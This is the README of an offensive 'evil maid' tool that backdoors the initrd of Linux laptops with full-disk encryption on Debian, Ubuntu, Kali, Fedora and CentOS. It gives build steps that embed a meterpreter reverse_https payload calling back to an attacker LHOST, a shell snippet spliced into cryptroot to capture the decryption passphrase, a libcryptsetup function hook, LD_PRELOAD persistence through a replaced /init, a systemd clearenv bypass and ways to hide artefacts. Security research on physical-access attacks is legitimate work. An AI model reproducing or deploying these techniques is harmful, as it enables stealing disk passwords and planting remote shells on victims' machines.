# Initrd encrypted root fs attack

![EvilAbigail](Screenshot.png?raw=true)

## Scenario
 * Laptop left turned off with FDE turned on
 * Attacker boots from USB/CD/Network
 * Script executes and backdoors initrd
 * User returns to laptop, boots as normal
 * Backdoored initrd loads:
   * (Debian/Ubuntu/Kali) `.so` file into `/sbin/init` on boot, dropping a shell
   * (Fedora/CentOS) `LD_PRELOAD` `.so` into `DefaultEnviroment`, loaded globally, dropping a shell.

## Supported Distros
 * Ubuntu 14.04.3
 * Debian 8.2.0
 * Kali 2.0
 * Fedora 23
 * CentOS 7

## Current Features
 * `python/meterpreter/reverse_https` to compile time LHOST
 * FDE decryption password stored in meterpreter environment (`getenv PASSWORD`)

## Details
### Compiling
See the `Makefile` for more information/configuration, `LHOST` is required in the
environment to build the `.so` as `msfvenom` is piped in at compile time. It is also necessary to have `libcrypsetup-dev` (or equivalent) installed on the build machine.

Generic Instructions (builds iso image in cwd):
`LHOST=192.168.56.101 make rev.so iso`


### isolinux.cfg
The following options have been appended to the kernel boot:

`mc superuser nodhcp quiet loglevel=0`

Furthermore, the `prompt` value has been set to `0` to allow fully automated
execution.

### Timing
Approximate nefarious boot -> backdoored time: ~2 minutes
Approximate legit boot -> shell ~90 seconds (configurable, we want networking
up before us)

### Prerequisites
`core.d` is an unpacked core.gz from TinyCore with the below packages merged in.

`Core-current` is an unpacked `Core-current.iso`

The following packages have been installed inside tinycore (python, filesystem support):

 * bzip2-lib.tcz
 * filesystems-3.16.6-tinycore.tcz
 * gdbm.tcz
 * libffi.tcz
 * mtd-3.16.6-tinycore.tcz
 * ncurses.tcz
 * openssl.tcz
 * python.tcz
 * readline.tcz
 * sqlite3.tcz

### Adding new signatures
At a minimum signature is as follows:

```
"exampleOS" : {
    "IDENTIFIER" : "grep EXAMPLEOS etc/initrd-release",
    "ROOT" : "${rootmnt}",
    "FILENAME" : "/ldlinux.so.1",
    "INITRDFILENAME" : "hda1"
}
```

 * `exampleOS` is a unique name for this OS.
 *  `IDENTIFIER` is a shell command that has an exit code `0` when run against the correct initrd, and `!0` for anything else.
 *  `ROOT` is the full path or variable where the new root is mounted after decryption.
 *  `FILENAME` is the full path to drop our binary on the root fs. Take care to know what `initrd` mounts and what is mounted later on.
 *  `INITRDFILENAME` is the full path of the binary inside the initrd. This is copied inside `Makefile` (`cp ... core.d/...`) so it should match that.

After that, every triple of `*FILE`, `*PRE`, `*POST` is run against the initrd as a `re.sub` (e.g `re.sub(*PRE, *POST, *FILE)`. The contents of `*PRE` and `*POST` are expanded using `.format(**config[detectedOS])`, so feel free to expand your signature to inject items.

There is no limit to the number of replacements you can run.

#### Notes
 * `\\1` will expand to the full contents of the match (`*PRE`) when used inside the replace (`*POST`).
 * Be careful with: `| $`
 

### Nitty Gritty
#### Payload
The `python/meterpreter/reverse_https` metasploit payload was chosen because it is more platform independant than the `linux/*/meterpreter/reverse_tcp` payloads. `python` seems to be installed by default on all the tested systems.

By default, the payload is generated at compile time and piped into the `.c` file as a `#define`. This makes iterations easier, but it shouldn't be hard to save the payload and insert it manually.

#### Debian based (Debian, Ubuntu, Kali)
##### Dropping the shell
Debian based systems (Debian, Ubuntu etc) use a standard gzipped cpio image as the initramfs. This contains the default `/init` script which runs through preparing the system for full boot. This includes asking the user for their password and mounting the encrypted root fs.

For dropping our `.so`, we wait until the root filesystem has been mounted (so after the user has been asked for their password) and copy the `.so` to the `/dev` filesystem. The `/dev` filesystem was chosen as it is accessible just before the `rootfs` is switched and it is a ram based mount. This means that our `.so` won't touch disk.

To actually use the dropped `.so`, we then use the `LD_PRELOAD` environmental variable on the `switch_root` call. This variable is passed to all child executables and as such, the final `/sbin/init` script will have the module loaded. To keep this relatively quiet, we check if we are loaded into `/sbin/init`, and if so, we unset the `LD_PRELOAD` variable and delete the `.so`. This functionality can easily be disabled if we wanted to hook specific applications.

To force execution of the `.so`, by default after loading, we use the `gcc` flag `-Wl,-init,shell`, where `shell` is our main function. This specifies which function we want to call on init of the `.so`. Think of this as an analogue to Windows' `DllMain`.

##### Password stealing

The part of the `init` script in charge of asking the user for their password and mounting the root filesystem is as follows:

`scripts/local-top/cryptroot:`

```
if [ ! -e "$NEWROOT" ]; then
        if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
             $cryptkeyscript "$cryptkey" | $cryptcreate --key-file=- ; then
                message "cryptsetup: cryptsetup failed, bad password or options?"
                continue
        fi
fi
```

The important part for us is where the output of `$cryptkeyscript` is piped into `$cryptcreate`. `$cryptkeyscript` is the password asker, and `$cryptcreate` is the disk mounter. This pipe makes it very easy for us to attack. We insert the following code where the pipe is to write out the password to the end of our `.so`:

`(read P; echo -ne \\\\\\\\x00$P >> /OUR.SO; echo -n $P)`

This will read the password into the variable `$P`, and both write it to the end of the `.so` and echo it out again. This code will be transparent for the purposes of `$cryptkeyscript` and `$cryptcreate`, but it will have the site effect of exfiltrating the password. We use `\\\\\\\\x00` to prepend a null byte (accounting for many levels of shell escaping) to the password. This makes it much easier for our `.so` to read the password back, as it just needs to read backwards from the end of itself until it sees a null byte.

To provide this password to the attacker, it is used as an environmental variable in the invocation of the payload. This means that the attacker can just use the meterpreter command `getenv PASSWORD` to retrieve the password.

##### Artefacts

Due to the way the `.so` is being loaded, there will be references to it in both `/proc/1/maps` and `/proc/1/environ`.

The `maps` file is a list of loaded modules. The following excerpt shows the contents of this file. Note the `(deleted)`, could potentially raise suspicion. However, unlike normal binaries, it is not possible to access the `.so` without directly carving it out of memory after it has been deleted.

```
7f9ee8a56000-7f9ee8a58000 r-xp 00000000 00:06 9264                       /dev/hda1 (deleted)
7f9ee8a58000-7f9ee8c57000 ---p 00002000 00:06 9264                       /dev/hda1 (deleted)
7f9ee8c57000-7f9ee8c58000 rw-p 00001000 00:06 9264                       /dev/hda1 (deleted)
```

The `environ` file is a `NULL` separated list of environmental variables at invocation. Because it is from invocation this means that any modifications we make at runtime (unsetting `LD_PRELOAD`) will not be reflected.

In both of these cases, becuase we can be hooked into any and all system processes, we could just hook the `read(2)` function and remove any references to ourselves.

##### Kali
Kali is sort of a special case. It has the chained cpio as mentioned below, but doesn't use `systemd` to boot. As such, the `DRACUT` OS rule has been generalized such that it extracts blindly, and then the second OS detection catches Kali.

If you add an OS with a cpio containing only `kernel/x86/microcode/GenuineIntel.bin`, the `IDENTIFIER` rule should be for the appended cpio, as we will automatically find and extract it.

#### Redhat Based (Fedora, CentOS)

These systems have a different format for their initrd image compared to Debian based systems. The initrd files stored in `/boot` are an almost empty cpio archive, with a gzipped cpio archive appended. This second archive is the one containing the `initramfs`. To unpack this second archive it is necessary to parse the first cpio archive to find the end. Alternatively you can find the string `TRAILER!!!` and read on until you find gzip magic (`\x1f\x8b`).

Another difference of these systems is that they are systemd based, and as such the `/init` executable in the `initamfs` is a symlink to the `systemd` binary, rather than a flat `sh` script. To bypass this limitation, it is necessary to modify the `.service` files related to mounting the root filesystem.

The `usr/lib/systemd/system/initrd-switch-root.service` contains the script which is used to pivot to the newly decrypted root. Using the `ExecStartPre` pragma it is possible to execute other programs before the pivot takes place.

SELinux is present on CentOS, restricting the use of `LD_PRELOAD`. One working path is `/lib`. This was located by reading the file at `/etc/selinux/targeted/modules/active/file_contexts` for a `system_u:object_r:lib_t` labelled location.

##### Dropping the shell
Because systemd calls `clearenv()` before switching root, our `LD_PRELOAD` variable is wiped out. To bypass this, we can hook `clearenv()`, and always just replace the environment with only  `LD_PRELOAD`. However, to achieve this, we need to be PID 1 inside the initrd. This is trickier as it is not possible to `LD_PRELOAD` into this process. To get around this, we have replaced `/init`  with a bash shell script as follows:

```
#!/bin/bash
export LD_PRELOAD=/hda1
exec /usr/lib/systemd/systemd
```

This works becuase `/init` is just a symlink to `/usr/lib/systemd/systemd`. `exec` is used so that the process retains the parend PID (1).

Once this is impemented, and `clearenv()` is neutralised, it is possible to set `LD_PRELOAD` for the real pid 1 inside the new root.

##### Password Stealing
systemd handles passwords for encrypted filesystems completely differently to Debian based init scripts. The passwords are passed around using Unix sockets which allow you to send credentials. To get around this complexity, the easiest method We found to access the password was to hook the `crypt_activate_by_passphrase` function from `libcryptsetup`. The relevant parts of the function declaration are as follows:

```
int crypt_activate_by_passphrase(..., const char *passphrase, size_t passphrase_size, ...);
```

To access the password we simply hook this function, save `passphrase` to a file and call the original function obtained by `dlsym(RTLD_NEXT, ...)`. As above, we appended our password to the `.so` so it is able to parse itself and make the password available to meterpreter.

##### Artefacts
As above, the .so shows up in `/proc/1/maps`, `/proc/1/environ` and `ps` output.
